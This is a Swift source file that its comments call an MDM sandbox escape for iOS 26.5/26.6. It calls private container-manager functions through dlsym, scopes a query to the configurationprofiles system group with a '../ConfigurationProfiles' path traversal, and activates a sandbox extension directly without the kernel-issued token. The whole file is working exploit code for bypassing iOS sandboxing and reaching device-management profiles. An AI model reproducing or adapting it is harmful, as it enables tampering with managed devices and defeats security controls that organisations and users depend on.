//
//  mdm.swift
//  mond
//
//  MDM sandbox escape for iOS 26.5/26.6.
//
//  Strategy:
//  - bad_query returns -4 for configurationprofiles on iOS 26.5/26.6 because
//    the kernel refuses to issue a sandbox extension token via copy_sandbox_token.
//  - container_object_sandbox_extension_activate bypasses the token path and
//    directly activates the extension.
//  - set_part_domain is used to scope the extension to ConfigurationProfiles,
//    but we do NOT rely on get_path() for the return value because it concatenates
//    the domain string literally (producing "Library/Caches/../ConfigurationProfiles"
//    or "Library/Caches/./ConfigurationProfiles"). Instead we return the known path.
//

import Foundation
import XPC

private typealias mdm_create_fn   = @convention(c) () -> UnsafeMutableRawPointer?
private typealias mdm_activate_fn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Bool
private typealias mdm_free_fn     = @convention(c) (UnsafeMutableRawPointer?) -> Void
private typealias mdm_u64_fn      = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
private typealias mdm_bool_fn     = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Void
private typealias mdm_obj_fn      = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void
private typealias mdm_str_fn      = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
private typealias mdm_res_fn      = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?

private func mdm_sym<T>(_ h: UnsafeMutableRawPointer, _ name: String, as: T.Type) -> T? {
    guard let s = dlsym(h, name) else { print("(mdm) missing: \(name)"); return nil }
    return unsafeBitCast(s, to: T.self)
}

/// Activate a sandbox extension for the configurationprofiles SystemGroup.
/// On success returns the well-known ConfigurationProfiles path.
/// On failure returns nil.
func grant_mdm_access() -> String? {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
        print("(mdm) dlopen failed")
        return nil
    }
    defer { dlclose(lib) }

    guard
        let create     = mdm_sym(lib, "container_query_create",                     as: mdm_create_fn.self),
        let activate   = mdm_sym(lib, "container_object_sandbox_extension_activate", as: mdm_activate_fn.self),
        let free       = mdm_sym(lib, "container_query_free",                        as: mdm_free_fn.self),
        let set_cls    = mdm_sym(lib, "container_query_set_class",                   as: mdm_u64_fn.self),
        let set_tran   = mdm_sym(lib, "container_query_set_transient",               as: mdm_bool_fn.self),
        let set_gids   = mdm_sym(lib, "container_query_set_group_identifiers",       as: mdm_obj_fn.self),
        let set_plat   = mdm_sym(lib, "container_query_operation_set_platform",      as: mdm_u64_fn.self),
        let set_flag   = mdm_sym(lib, "container_query_operation_set_flags",         as: mdm_u64_fn.self),
        let set_part   = mdm_sym(lib, "container_query_operation_set_part",          as: mdm_u64_fn.self),
        let set_domain = mdm_sym(lib, "container_query_operation_set_part_domain",   as: mdm_str_fn.self),
        let get_res    = mdm_sym(lib, "container_query_get_single_result",           as: mdm_res_fn.self)
    else { return nil }

    guard let q = create() else {
        print("(mdm) container_query_create returned nil")
        return nil
    }

    set_cls(q, 13)      // Class 13 = SystemGroup
    set_tran(q, false)

    let arr = xpc_array_create(nil, 0)
    xpc_array_set_string(arr, XPC_ARRAY_APPEND, "systemgroup.com.apple.configurationprofiles")
    set_gids(q, arr)

    set_plat(q, 2)
    set_flag(q, (1 << 32) | (1 << 39))

    // Part 3 = Library/Caches as the anchor point
    set_part(q, 3)
    // Redirect scope to ConfigurationProfiles.
    // Use a path relative to Library/Caches:
    // "../ConfigurationProfiles" = Library/Caches -> Library -> ConfigurationProfiles
    // NOTE: We do NOT use get_path() to derive the return value because it appends
    // the domain string literally. We use the hardcoded TweakPaths.mdm_profiles instead.
    set_domain(q, "../ConfigurationProfiles")

    guard let res = get_res(q) else {
        free(q)
        print("(mdm) container_query_get_single_result returned nil")
        return nil
    }

    let ok = activate(res, true)
    free(q)

    if !ok {
        print("(mdm) container_object_sandbox_extension_activate returned false")
        return nil
    }

    // Activation succeeded. The sandbox extension now covers ConfigurationProfiles.
    // Return the well-known path directly — do NOT derive from get_path() which
    // would give a literal-concatenated path like "Library/Caches/../ConfigurationProfiles".
    print("(mdm) sandbox extension activated for ConfigurationProfiles")
    return TweakPaths.mdm_profiles
}
